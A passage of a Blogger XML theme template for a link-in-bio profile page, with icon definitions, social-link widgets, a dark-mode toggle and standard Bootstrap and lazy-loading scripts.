              <b:case value='google'/><path d='M16.5 6.6a7 7 0 1 0 2.2 7.4H12v-4h10.8a11 11 0 1 1-3.3-6Z'/>
              <b:case value='envelope'/><rect height='16' rx='2' width='20' x='2' y='4'/><path d='m22 8-10 5L2 8'/>
              <b:case value='vk'/><rect height='22' rx='5' width='22' x='1' y='1'/><path d='M7 8.5a7 8 0 0 0 5 7v-7m5 0Q16 11 13 12q3 1 4 3.5M12 12h1'/>
              <b:case value='bilibili'/><rect height='16' rx='4' width='20' x='2' y='5'/><path d='m7 2 3 3m7-3-3 3m-5 9v-2m6 0v2'/>
              <b:case value='deviantart'/><path d='M9.4 11H5V6h7.5L15 2h4v4l-4.4 7H19v5h-7.5L9 22H5v-4Z'/>
              <b:case value='get-pocket'/><path d='M21 3a2 2 0 0 1 2 2v6a9 9 0 0 1-22 0V5a2 2 0 0 1 2-2ZM7 10l5 4 5-4'/>
              <b:case value='binance'/><path d='m12 7 5 5-5 5-5-5Zm-9 3-2 2 2 2m18-4 2 2-2 2M6 7l6-6 6 6m0 10-6 6-6-6'/>
              <b:case value='codepen'/><path d='m12 2 10 6.5v7L12 22 2 15.5v-7zm0 20v-6.5m10-7-10 7-10-7m0 7 10-7 10 7M12 2v6.5'/>
              <b:case value='book'/><path d='M20 22H7a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3h13zM4 19a3 3 0 0 1 3-3h13'/>
              <b:case value='cart-shopping'/><path d='M1 2h4l3 12.4a2 2 0 0 0 2 1.6h9a2 2 0 0 0 2-1.6L23 6H6'/><circle cx='9' cy='21' r='1'/><circle cx='20' cy='21' r='1'/>
              <b:case value='coffee'/><path d='M6 2v3m4-3v3m4-3v3m4 4v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V9h17a1 1 0 0 1 0 8h-1'/>
              <b:case value='images'/><rect height='18' rx='2' width='18' x='5' y='1'/><circle cx='17' cy='7' r='2'/><path d='m5 16 6-6 9 9M1 5v15a3 3 0 0 0 3 3h15'/>
              <b:case value='location-crosshairs'/><path d='M23 12h-3M4 12H1m11-8V1m0 22v-3'/><circle cx='12' cy='12' r='8'/><circle cx='12' cy='12' r='3'/>
              <b:case value='location-dot'/><circle cx='12' cy='10' r='3'/><path d='m12 23-6-6a9 9 0 1 1 12 0z'/>
              <b:case value='location'/><path d='m12 23-6-6a9 9 0 1 1 12 0z'/>
              <b:cace value='folder'/><path d='M9 3H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-9Z'/>
              <b:case value='user'/><circle cx='12' cy='6' r='4'/><path d='M21 22a1 1 0 0 0-18 0Z'/>
              <b:case value='wordpress'/><path d='M1 8h5M2.8 8 8 21l4-10M9 8h5m-3.2 0L16 21l3.2-7.5C25 0 14 2 17 7s2.2 6.5 2.2 6.5M8 21l4-10'/>
              <b:case value='cart-shopping'/><path d='M1 2h4l3 12.4a2 2 0 0 0 2 1.6h9a2 2 0 0 0 2-1.6L23 6H6'/><circle cx='9' cy='21' r='1'/><circle cx='20' cy='21' r='1'/>
              <b:case value='shopee'/><path d='M22.2 5.75h-4.95C17.15 2.55 14.85 0 12 0S6.85 2.55 6.75 5.75H1.8c-.25 0-.45.2-.45.45v.05l.7 15.45v.25c.1 1.1.9 1.95 1.95 2h15.75c1.1-.05 1.95-.9 2.05-2v-.15l.75-15.5c.1-.35-.1-.55-.35-.55zM12 1.4c2.05 0 3.75 1.95 3.8 4.35H8.2C8.25 3.35 9.95 1.4 12 1.4zm3.95 16.5c-.15 1.15-.85 2.1-1.95 2.55-.6.25-1.4.4-2.05.35-1-.05-1.95-.3-2.8-.7-.3-.15-.8-.5-1.15-.75-.1-.05-.1-.15-.05-.25.1-.1.4-.6.45-.65.05-.1.2-.1.3-.05 0 0 .1.1.15.1.85.65 1.9 1.15 3.1 1.2 1.5 0 2.6-.7 2.8-1.75.2-1.15-.7-2.15-2.45-2.7-.55-.15-1.95-.75-2.25-.9-1.25-.7-1.8-1.65-1.7-2.8.1-1.6 1.6-2.8 3.5-2.8.9 0 1.75.2 2.5.5.3.1.8.4 1 .55.15.1.1.2.05.3-.1.1-.3.45-.4.6-.05.1-.15.1-.25.05-.95-.65-1.95-.85-2.85-.9-1.3.05-2.3.8-2.35 1.85 0 .95.7 1.65 2.25 2.15 3.15.95 4.35 2.15 4.15 4.05z'/>
               <b:case value='tokopedia'/><path clip-rule='evenodd' d='M12 3.5a3.124 3.124 0 0 0-2.751 1.641A8.128 8.128 0 0 1 12 5.917a8.174 8.174 0 0 1 2.751-.776A3.126 3.126 0 0 0 12 3.5ZM12 2a4.626 4.626 0 0 0-4.344 3.035C6.617 5 5.308 5 3.566 5H3.5a.75.75 0 0 0-.75.75v15.5a.75.75 0 0 0 .75.75H15a6.25 6.25 0 0 0 6.25-6.25v-10A.75.75 0 0 0 20.5 5h-.066c-1.741 0-3.05 0-4.089.035A4.628 4.628 0 0 0 12 2ZM4.25 6.5v14H15a4.75 4.75 0 0 0 4.75-4.75V6.5c-2.313.001-3.703.012-4.734.121-1.087.114-1.75.335-2.681.8a.75.75 0 0 1-.671 0c-.931-.465-1.594-.686-2.681-.8-1.031-.108-2.421-.12-4.734-.121Zm2 5.5a2.25 2.25 0 1 1 4.5 0 2.25 2.25 0 0 1-4.5 0ZM8.5 8.25a3.75 3.75 0 1 0 .416 7.477l2.553 2.553a.75.75 0 0 0 1.061 0l2.553-2.553a3.75 3.75 0 1 0-3.084-5.076A3.75 3.75 0 0 0 8.501 8.25Zm5.01 6.929a3.763 3.763 0 0 1-1.51-1.83 3.763 3.763 0 0 1-1.51 1.83l1.51 1.51 1.51-1.51ZM15.5 9.75a2.25 2.25 0 1 0 0 4.5 2.25 2.25 0 0 0 0-4.5ZM9.5 12a1 1 0 1 1-2 0 1 1 0 0 1 2 0Zm6 1a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z' fill='#000' fill-rule='evenodd'/>
              <b:case value='bag-shopping'/><path d='M3 7v11a4 4 0 0 0 4 4h10a4 4 0 0 0 4-4V7Zm13 3V6a4 4 0 0 0-8 0v4'/>
              <b:case value='blibli'/><path clip-rule='evenodd' d='M33.125 13.625c1.25 0 2.125 1 1.875 2.125a59.25 59.25 0 0 0 1 30c.375 1.125-.625 2.25-1.75 2.25H4c-1.25 0-2.25-1.25-1.875-2.375 3-10.625 3-18 1-29.875-.125-1.25.625-2 1.875-2h.125c6.125.625 10 .875 14 .875 3.75 0 7.75-.25 13.75-.875h.25Zm-18.75 8.5c0 .75-.625 1.375-1.5 1.375a1.25 1.25 0 0 1-1.25-1.375 1.25 1.25 0 0 1 1.25-1.375c.875 0 1.5.625 1.5 1.25Zm10.75 1.375c.75 0 1.5-.625 1.5-1.375s-.75-1.375-1.5-1.375a1.25 1.25 0 0 0-1.25 1.25 1.25 1.25 0 0 0 1.25 1.5ZM11.25 26.875c0 2.5 1.875 7.5 7.75 7.5 6 0 7.875-5 7.875-7.5 0-.5-.5-1-1-1s-.875.5-.875 1c0 1.875-1.5 5.75-6 5.75a5.75 5.75 0 0 1-5.875-5.75c0-.5-.375-1-1-1-.5 0-.875.5-.875 1Z' fill='#0072FF' fill-rule='evenodd'/><path d='M23 8.5A3.875 3.875 0 1 0 21.125 1 3.875 3.875 0 1 0 23 8.5Z' fill='#FFCD00'/><path d='M31.5 12.5v-4c.125-1.25-1.25-2.125-2.5-1.375l-7.25 4.75c-.5.25-.875.75-1 1.25 3 0 6.25-.25 10.75-.625Z' fill='#00CDC7'/><path d='M6.875 12.5c4.875.5 8.5.75 12.125.75L17.25 7.5a2 2 0 0 0-2.5-1.25L7.625 8.125c-1.125.25-1.75 1.5-1.25 2.5l.375 1.75Z' fill='#FF4646'/>
              <b:default/><circle cx='12' cy='12' r='10'/>
            </b:switch>
          </svg>
        </b:includable>
        
        <b:includable id='it:icons'>
          <b:if cond='(data:link.name in [&quot;facebook&quot;]) or (data:link.target contains &quot;//facebook.&quot;)  or (data:link.target contains &quot;//fb.&quot;)'>
            <b:include data='{ icon: &quot;facebook&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;instagram&quot;]) or (data:link.target contains &quot;//instagram.&quot;)'/>
            <b:include data='{ icon: &quot;instagram&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;twitter&quot;]) or (data:link.target contains &quot;//twitter.&quot;)'/>
            <b:include data='{ icon: &quot;twitter&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;youtube&quot;]) or (data:link.target contains &quot;//www.youtube.&quot;)'/>
            <b:include data='{ icon: &quot;youtube&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;linkedin&quot;]) or (data:link.target contains &quot;//www.linkedin.&quot;)'/>
            <b:include data='{ icon: &quot;linkedin&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;pinterest&quot;]) or (data:link.target contains &quot;pinterest.com&quot;)'/>
            <b:include data='{ icon: &quot;pinterest&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;whatsapp&quot;]) or (data:link.target contains &quot;//wa.&quot;)'/>
            <b:include data='{ icon: &quot;whatsapp&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;telegram&quot;]) or (data:link.target contains &quot;//t.&quot;)'/>
            <b:include data='{ icon: &quot;telegram&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;tiktok&quot;]) or (data:link.target contains &quot;//www.tiktok.&quot;)'/>
            <b:include data='{ icon: &quot;tiktok&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;github&quot;]) or (data:link.target contains &quot;github.com&quot;) or (data:link.target contains &quot;githubusercontent.com&quot;)'/>
            <b:include data='{ icon: &quot;github&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;spotify&quot;]) or (data:link.target contains &quot;spotify.com&quot;)'/>
            <b:include data='{ icon: &quot;spotify&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;discord&quot;]) or (data:link.target contains &quot;//discord.&quot;)'/>
            <b:include data='{ icon: &quot;discord&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;dribbble&quot;]) or (data:link.target contains &quot;//dribbble.&quot;)'/>
            <b:include data='{ icon: &quot;dribbble&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;medium&quot;]) or (data:link.target contains &quot;//medium.&quot;)'/>
            <b:include data='{ icon: &quot;medium&quot; }' name='i:svg'/>
			
            <b:elseif cond='(data:link.name in [&quot;paypal&quot;]) or (data:link.target contains &quot;paypal.com&quot;) or (data:link.target contains &quot;paypal.me&quot;)'/>
            <b:include data='{ icon: &quot;paypal&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;twitch&quot;]) or (data:link.target contains &quot;//twitch.&quot;)'/>
            <b:include data='{ icon: &quot;twitch&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.name in [&quot;signal&quot;]) or (data:link.target contains &quot;//signal.&quot;)'/>
            <b:include data='{ icon: &quot;signal&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;reddit&quot;]) or (data:link.target contains &quot;//reddit.&quot;)'/>
            <b:include data='{ icon: &quot;reddit&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;playstore&quot;]) or (data:link.target contains &quot;play.google.com&quot;)'/>
            <b:include data='{ icon: &quot;google-play&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;applestore&quot;]) or (data:url contains &quot;apps.apple.com&quot;)'/>
            <b:include data='{ icon: &quot;app-store&quot; }' name='i:meteor'/>
            
            <b:elseif cond='(data:link.name in [&quot;email&quot;,&quot;e-mail&quot;,&quot;Gmail&quot;]) or (data:url contains &quot;mailto:&quot;)'/>
            <b:include data='{ icon: &quot;envelope&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;threads&quot;]) or (data:url contains &quot;//www.threads.&quot;)'/>
            <b:include data='{ icon: &quot;threads&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;tumblr&quot;]) or (data:url contains &quot;//www.tumblr.&quot;)'/>
            <b:include data='{ icon: &quot;tumblr&quot; }' name='i:svg'/>
            
            <b:elseif cond='(data:link.name in [&quot;vk&quot;]) or (data:url contains &quot;//vk.&quot;)'/>
            <b:include data='{ icon: &quot;vk&quot; }' name='i:svg'/>
            
            <b:elseif cond='data:link.name in [&quot;shop&quot;,&quot;Online shop&quot;,&quot;cart&quot;]'/>
            <b:include data='{ icon: &quot;cart-shopping&quot; }' name='i:svg'/>

            <b:elseif cond='(data:link.target contains &quot;//www.blibli.&quot;) or (data:link.target contains &quot;//shopee.&quot;) or (data:link.target contains &quot;//www.tokopedia.&quot;) or (data:link.target contains &quot;//www.lazada.&quot;)'/>
            <b:include data='{ icon: &quot;bag-shopping&quot; }' name='i:svg'/>
            
            <b:elseif cond='data:link.target in [&quot;{dropdown}&quot;]'/>
            <b:include data='{ icon: &quot;chevron-down&quot; }' name='i:svg'/>
            
            <b:else/>
            <b:include data='{ icon: &quot;link&quot; }' name='i:svg'/>
          </b:if>
        </b:includable>
        
        <b:includable id='post-authorImage'>
          <b:tag class='hasImage' expr:alt='data:title ? data:title : data:messages.image' name='img'>
            <b:class cond='data:view.url != data:view.url params { amp: &quot;1&quot; }' name='lazy'/>
            <b:attr cond='data:view.url == data:view.url' expr:value='resizeImage(data:sourceUrl,150,&quot;1:1&quot;)' name='data-src'/>
            <b:attr cond='data:view.url == data:view.url' name='src' value='data:image/png;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs='/>
          </b:tag>
          <noscript><img class='hasImage' expr:alt='data:title ? data:title : data:messages.image' expr:src='resizeImage(data:sourceUrl,150,&quot;1:1&quot;)'/></noscript>
        </b:includable>
        
        <b:includable id='widget-profile'>
          <b:if cond='data:widget.instanceId == &quot;Image1&quot;'>
            <div class='author-profile'>
              <div class='author-avatar'>
                <b:include name='post-authorImage'/>
              </div>
              <span class='author-desc'>
                <h3 class='author-name' expr:data-text='data:title'>
                  <span class='name'><data:title/></span>
                  <!-- Icon badge -->
                  <b:include data='{ icon: &quot;badge-check&quot; }' name='i:svg'/>
                </h3>
                <span class='author-about'><data:caption/></span>
              </span>
            </div>
            <b:if cond='data:skin.vars.g_stickyProfile'>
              <div class='sticky-profile hiddens'>
                <div class='author-avatars'>
                  <b:include name='post-authorImage'/>
                </div>
                <span class='author-desc'>
                  <h3 class='author-names' expr:data-text='data:title'>
                    <span class='name'><data:title/></span>
                    <!-- Icon badge -->
                    <b:include data='{ icon: &quot;badge-check&quot; }' name='i:svg'/>
                  </h3>
                  <span class='author-about'><data:caption/></span>
                </span>
              </div>
            </b:if>
          </b:if>
        </b:includable>
        
        <b:includable id='widget-title'>
          <b:if cond='data:title == &quot;no-style&quot;'>
            <b:class name='no-style'/>
          </b:if>
          <b:if cond='data:defaultTitle or data:title'>
            <b:if cond='data:widget.sectionId not in [&quot;it-linktree-main&quot;]'>
              <div class='sector-title d-flex flex-wrap justify-content-center gap-2'>
                <b:include data='{ icon: &quot;coffee&quot; }' name='i:svg'/>
                <h3 class='fs-5 fw-semibold'><data:title/></h3>
              </div>
            </b:if>
          </b:if>
        </b:includable>

        <b:includable id='text-content'>
          <b:if cond='data:widget.sectionId == &quot;linktree-two&quot;'>
            <div class='sector-subtittle small text-body-secondary mt-2 opacity-75'>
              <data:content/>
            </div>
          </b:if>
        </b:includable>
        
        <b:includable id='animation-content'>
          <b:if cond='data:skin.vars.g_animation'>
            <b:class name='animation'/>
			<b:class cond='data:widget.sectionId in [&quot;it-linktree-main&quot;,&quot;linktree-two&quot;]' expr:name='data:widget.sectionId == &quot;it-linktree-main&quot; ? &quot;d-2&quot; : &quot;d-4&quot;'/>
          </b:if>
        </b:includable>
        
        <b:includable id='linklist-content'>
          <b:if cond='data:widget.sectionId == &quot;it-linktree-main&quot;'>
            <ul class='main-linktree' id='main-linktree' role='menubar'>
              <b:loop index='i' values='data:links' var='link'>
                <li>
                  <a class='social-link' expr:href='data:link.target in [&quot;{dropdown}&quot;] ? &quot;#&quot; : data:link.target' role='menuitem'>
                    <b:include name='it:icons'/>
                    <span class='social-title'><b:eval expr='data:link.name'/></span>
                    <b:attr cond='data:link.target or !data:link.target' expr:value='data:link.name' name='data-icon'/>
                    <b:class expr:name='data:link.target in [&quot;{dropdown}&quot;] ? &quot;is-toggle&quot; : &quot;is-multi&quot;'/>
                  </a>
                  <b:class cond='data:link.target in [&quot;{dropdown}&quot;]' expr:name='&quot;dropdown&quot;'/>
                </li>
              </b:loop>
            </ul>
            
            <b:elseif cond='data:widget.sectionId in [&quot;linktree-two&quot;]'/>
            <b:tag class='sector-content is-linktwo d-flex' name='div'>
              <b:loop index='soc' values='data:links' var='link'>
                <b:if cond='data:soc &lt;= 10'>
                  <b:tag class='social-link' expr:name='data:link.target != &quot;#&quot; ? &quot;a&quot; : &quot;span&quot;'>
                    <b:attr cond='data:link.target != &quot;#&quot;' expr:value='data:link.target' name='href'/>
                    <b:attr cond='data:link.target != &quot;#&quot;' name='role' value='button'/>
                    <b:attr cond='data:link.target != &quot;#&quot;' expr:value='data:link.name' name='aria-label'/>
                    <b:attr cond='data:link.target != &quot;#&quot;' name='target' value='_blank'/>
                    <b:attr cond='data:link.target != &quot;#&quot;' name='rel' value='noopener'/>
                    <b:include data='{ icon: &quot;link&quot; }' name='i:svg'/>
                    <span class='social-title'><data:link.name/></span>
                  </b:tag>
                </b:if>
              </b:loop>
            </b:tag>
            
            <b:else/>
            <b:tag class='sector-content' cond='data:widget.sectionId not in [&quot;linktree-two&quot;]' name='div'>
              <ul class='link-list'>
                <b:loop values='data:links' var='link'>
                  <li><a expr:href='data:link.target'><data:link.name/></a></li>
                </b:loop>
              </ul>
            </b:tag>
          </b:if>
        </b:includable>
        
      </b:defaultmarkup>
    </b:defaultmarkups>
  </head>
  
  <body class='loader it-template'>
    
    <main class='main wrapper container-xxl'>
      <div class='container'>

        <b:section class='header' id='header' maxwidgets='1' name='Profile Header' showaddelement='false'>
          <b:widget id='Image1' locked='true' title='InpuTekno.Com' type='Image' version='2' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='displayUrl'>https://cdn.inputekno.com/icon-inputekno/maskable-android-icon-512x512.png</b:widget-setting>
              <b:widget-setting name='displayHeight'>512</b:widget-setting>
              <b:widget-setting name='sectionWidth'>1132</b:widget-setting>
              <b:widget-setting name='shrinkToFit'>true</b:widget-setting>
              <b:widget-setting name='displayWidth'>512</b:widget-setting>
              <b:widget-setting name='link'/>
              <b:widget-setting name='caption'>Hi. Lets connect and be friends!</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
              <b:include name='content'/>
            </b:includable>
            <b:includable id='content'>
              <b:include name='widget-profile'/>
            </b:includable>
          </b:widget>
          <b:widget id='TextList000' locked='true' title='Header Icon' type='TextList' version='2' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='shownum'>2</b:widget-setting>
              <b:widget-setting name='sorting'>NONE</b:widget-setting>
              <b:widget-setting name='item-0'>Dark Mode</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
              <b:include name='content'/>
            </b:includable>
            <b:includable id='content'>
              <ul class='top-toggle list-unstyled d-flex'>
                <b:loop index='icons' values='data:items' var='item'>
                  <b:if cond='data:icons &lt;= 0'>
                    <b:if cond='data:item == &quot;Dark Mode&quot;'/>
                    <b:if cond='data:view.url != data:view.url params { amp: &quot;1&quot; }'>
                      <li class='dropdown'>
                        <b:class cond='data:item == &quot;Dark Mode&quot;' name='is-dark'/>
                        <!--[ Dark mode button ]-->
                        <label aria-expanded='false' class='theme-toggle dropdown-toggle' data-bs-display='static' data-bs-toggle='dropdown' expr:aria-label='data:item'>
                          <b:include data='{ icon: &quot;sun&quot; }' name='i:svg'/>
                          <span class='d-none' id='bd-theme-text'><data:item/></span>
                        </label>
                        <ul class='dropdown-menu dropdown-menu-end shadow-sm rounded'>
                          <label class='titledark px-3 fw-medium' expr:aria-label='data:item'><data:item/></label>
                          <hr class='dropdown-divider'/>
                          <li>
                            <button class='dropdown-item d-flex align-items-center gap-2 active' data-bs-theme-value='light' type='button'>
                              <b:include data='{ icon: &quot;sun&quot; }' name='i:svg'/>
                              <span>Light</span>
                            </button>
                          </li>
                          <li>
                            <button class='dropdown-item d-flex align-items-center gap-2' data-bs-theme-value='dark' type='button'>
                              <b:include data='{ icon: &quot;moon&quot; }' name='i:svg'/>
                              <span>Dark</span>
                            </button>
                          </li>
                          <li>
                            <button class='dropdown-item d-flex align-items-center gap-2' data-bs-theme-value='auto' type='button'>
                              <b:include data='{ icon: &quot;devices&quot; }' name='i:svg'/>
                              <span>Auto</span>
                            </button>
                          </li>
                        </ul>
                      </li>
                    </b:if>
                  </b:if>
                </b:loop>
              </ul>
            </b:includable>
          </b:widget>
        </b:section>
        
        <b:section class='it-linktree-main' id='it-linktree-main' maxwidgets='1' name='Main Menu' showaddelement='yes'>
          <b:widget id='LinkList101' locked='true' title='' type='LinkList' version='2' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='text-10'>spotify</b:widget-setting>
              <b:widget-setting name='link-17'>{dropdown}</b:widget-setting>
              <b:widget-setting name='link-16'>https://www.tokopedia.com/</b:widget-setting>
              <b:widget-setting name='sorting'>NONE</b:widget-setting>
              <b:widget-setting name='link-18'>https://www.blibli.com/linkproduk</b:widget-setting>
              <b:widget-setting name='link-1'>https://facebook.com/</b:widget-setting>
              <b:widget-setting name='link-13'>https://www.threads.net/@inputekno</b:widget-setting>
              <b:widget-setting name='link-2'>https://instagram.com/</b:widget-setting>
              <b:widget-setting name='link-12'>https://wa.me/</b:widget-setting>
              <b:widget-setting name='link-15'>https://shopee.co.id/</b:widget-setting>
              <b:widget-setting name='link-0'>https://go.inputekno.com/web</b:widget-setting>
              <b:widget-setting name='link-14'>{dropdown}</b:widget-setting>
              <b:widget-setting name='link-11'>https://discord.gg/</b:widget-setting>
              <b:widget-setting name='link-10'>https://open.spotify.com/</b:widget-setting>
              <b:widget-setting name='text-9'>telegram</b:widget-setting>
              <b:widget-setting name='link-9'>https://t.me/s/inputekno</b:widget-setting>
              <b:widget-setting name='text-8'>tiktok</b:widget-setting>
              <b:widget-setting name='link-7'>https://www.youtube.com/</b:widget-setting>
              <b:widget-setting name='link-8'>https://www.tiktok.com/@inputekno.id</b:widget-setting>
              <b:widget-setting name='link-5'>https://id.pinterest.com/</b:widget-setting>
              <b:widget-setting name='link-6'>https://github.com/</b:widget-setting>
              <b:widget-setting name='link-3'>https://twitter.com/</b:widget-setting>
              <b:widget-setting name='link-4'>https://www.linkedin.com/</b:widget-setting>
              <b:widget-setting name='text-1'>facebook</b:widget-setting>
              <b:widget-setting name='text-0'>Website</b:widget-setting>
              <b:widget-setting name='text-3'>twitter</b:widget-setting>
              <b:widget-setting name='text-2'>instagram</b:widget-setting>
              <b:widget-setting name='text-5'>pinterest</b:widget-setting>
              <b:widget-setting name='text-4'>linkedin</b:widget-setting>
              <b:widget-setting name='text-7'>youtube</b:widget-setting>
              <b:widget-setting name='text-6'>github</b:widget-setting>
              <b:widget-setting name='text-15'>_official shopee</b:widget-setting>
              <b:widget-setting name='text-16'>_official tokopedia</b:widget-setting>
              <b:widget-setting name='text-17'>_official blibli</b:widget-setting>
              <b:widget-setting name='text-18'>__SSD 100GB Promo</b:widget-setting>
              <b:widget-setting name='text-11'>discord</b:widget-setting>
              <b:widget-setting name='text-12'>whatsapp</b:widget-setting>
              <b:widget-setting name='text-13'>threads</b:widget-setting>
              <b:widget-setting name='text-14'>marketplace</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
              <b:include name='widget-title'/>
              <b:include name='content'/>
            </b:includable>
            <b:includable id='content'>
              <b:include name='linklist-content'/>
            </b:includable>
          </b:widget>
        </b:section>

        <b:section class='linktree-two' id='linktree-two' name='Linktree Alternatif' showaddelement='yes'>
          <b:widget id='Text1' locked='true' title='Free Web Tools' type='Text' version='2' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>These are the most visited tools because they contain useful information or resources, you will probably find something that will help you in your development.</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
              <div class='sector-wrap'>
                <b:include name='widget-title'/>
                <b:include name='text-content'/>
              </div>
            </b:includable>
          </b:widget>
          <b:widget id='LinkList104' locked='true' title='Daftar Link' type='LinkList' version='2' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='link-7'>https://www.inputekno.com/p/color-palettes.html</b:widget-setting>
              <b:widget-setting name='link-5'>#</b:widget-setting>
              <b:widget-setting name='link-6'>#</b:widget-setting>
              <b:widget-setting name='link-3'>#</b:widget-setting>
              <b:widget-setting name='link-4'>#</b:widget-setting>
              <b:widget-setting name='text-1'>Image to Webp</b:widget-setting>
              <b:widget-setting name='text-0'>WA Spoilers</b:widget-setting>
              <b:widget-setting name='text-3'>HTML Parse</b:widget-setting>
              <b:widget-setting name='text-2'>IG Font Generator</b:widget-setting>
              <b:widget-setting name='text-5'>Fake Tweet</b:widget-setting>
              <b:widget-setting name='text-4'>Gmail Generator</b:widget-setting>
              <b:widget-setting name='text-7'>Color Palletes</b:widget-setting>
              <b:widget-setting name='text-6'>Color Palletes</b:widget-setting>
              <b:widget-setting name='sorting'>NONE</b:widget-setting>
              <b:widget-setting name='link-1'>#</b:widget-setting>
              <b:widget-setting name='link-2'>#</b:widget-setting>
              <b:widget-setting name='link-0'>https://go.inputekno.com/web</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
              <b:include name='content'/>
            </b:includable>
            <b:includable id='content'>
              <b:include name='linklist-content'/>
            </b:includable>
          </b:widget>
        </b:section>
        
      </div>
    </main>

    <footer class='footer wrapper container border-top py-3 py-md-4 px-4 px-md-2' id='footer-wrapper'>
      <div class='footer-copyright d-flex cr-footer flex-wrap'>
        <small class='credit'>&#169; <span id='getYear'><b:if cond='data:view.url != data:view.url params { amp: &quot;1&quot; }'><script>/*<![CDATA[*/ var d = new Date(); var n = d.getFullYear(); document.getElementById('getYear').innerHTML = n; /*]]>*/</script><b:else/>2023</b:if></span> &#8231; <a expr:href='data:blog.homepageUrl.canonical'><data:blog.title/></a>. All rights reserved.</small>
      </div>
    </footer>
    
    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js'/>
    <b:include data='{ get: &quot;js&quot; }' name='it:assets'/>
    <b:include data='{ get: &quot;inlineJs&quot; }' name='it:assets'/>
    <script type='text/javascript'>//<![CDATA[
/*!
 * Color mode toggler for Bootstrap's docs (https://getbootstrap.com/)
 * Copyright 2011-2023 The Bootstrap Authors 
 * Licensed under the Creative Commons Attribution 3.0 Unported License.
 */
(()=>{"use strict";let e=()=>localStorage.getItem("theme"),t=e=>localStorage.setItem("theme",e),r=()=>{let t=e();return t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")},a=e=>{"auto"===e&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.setAttribute("data-bs-theme","dark"):document.documentElement.setAttribute("data-bs-theme",e)};a(r());let s=(e,t=!1)=>{let r=document.querySelector(".theme-toggle");if(!r)return;let a=document.querySelector(".titledark"),s=document.querySelector(".theme-toggle svg"),l=document.querySelector(`[data-bs-theme-value="${e}"]`),c=l.querySelector("svg").innerHTML,d=l.querySelector("svg").getAttribute("class");document.querySelectorAll("[data-bs-theme-value]").forEach(e=>{e.classList.remove("active"),e.setAttribute("aria-pressed","false")}),l.classList.add("active"),l.setAttribute("aria-pressed","true"),s.innerHTML=c,s.setAttribute("class",d);let u=`${a.textContent} (${l.dataset.bsThemeValue})`;r.setAttribute("aria-label",u),t&&r.focus()};window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",()=>{let t=e();"light"!==t&&"dark"!==t&&a(r())}),window.addEventListener("DOMContentLoaded",()=>{s(r()),document.querySelectorAll("[data-bs-theme-value]").forEach(e=>{e.addEventListener("click",()=>{let r=e.getAttribute("data-bs-theme-value");t(r),a(r),s(r,!0)})})})})();
/*@shinsenter/defer.js*/ !function(c,i,t){var f,o=/^data-(.+)/,u='IntersectionObserver',r=/p/.test(i.readyState),s=[],a=s.slice,d='lazied',n='load',e='pageshow',l='forEach',m='hasAttribute',h='shift';function p(e){i.head.appendChild(e)}function v(e,n){a.call(e.attributes)[l](n)}function y(e,n,t,o){return o=(o=n?i.getElementById(n):o)||i.createElement(e),n&&(o.id=n),t&&(o.onload=t),o}function b(e,n){return a.call((n||i).querySelectorAll(e))}function g(t,e){b('source',t)[l](g),v(t,function(e,n){(n=o.exec(e.name))&&(t[n[1]]=e.value)}),e&&(t.className+=' '+e),n in t&&t[n]()}function I(e){f(function(o){o=b(e||'[type=deferjs]'),function e(n,t){(n=o[h]())&&(n.parentNode.removeChild(n),(t=y(n.nodeName)).text=n.text,v(n,function(e){'type'!=e.name&&(t[e.name]=e.value)}),t.src&&!t[m]('async')?(t.onload=t.onerror=e,p(t)):(p(t),e()))}()})}(f=function(e,n){r?t(e,n):s.push(e,n)}).all=I,f.js=function(n,t,e,o){f(function(e){(e=y('SCRIPT',t,o)).src=n,p(e)},e)},f.css=function(n,t,e,o){f(function(e){(e=y('LINK',t,o)).rel='stylesheet',e.href=n,p(e)},e)},f.dom=function(e,n,t,o,i){function r(e){o&&!1===o(e)||g(e,t)}f(function(t){t=u in c&&new 